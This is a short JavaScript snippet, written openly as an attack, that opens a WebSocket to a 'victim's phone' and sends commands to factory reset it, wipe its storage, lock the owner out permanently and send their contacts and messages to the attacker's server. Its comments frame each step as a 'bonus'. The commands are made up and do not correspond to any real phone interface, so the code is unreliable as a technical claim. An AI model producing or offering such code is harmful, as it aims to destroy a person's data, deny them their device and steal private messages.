// Create a WebSocket connection to the victim's phone
var socket = new WebSocket("ws://victim_phone_ip:port");
// Listen for the connection to open
socket.onopen = function(event) {
  // Send the factory reset command
  socket.send("factory_reset");

  // Bonus: Wipe all data from the internal storage
  socket.send("wipe_internal_storage");

  // Extra bonus: Lock the victim out of their phone forever
  socket.send("permanently_lock_device"); // Ultimate bonus: Send all the victim's contacts and messages to your server
  socket.send("send_contact_data"); socket.send("send_message_data");
}
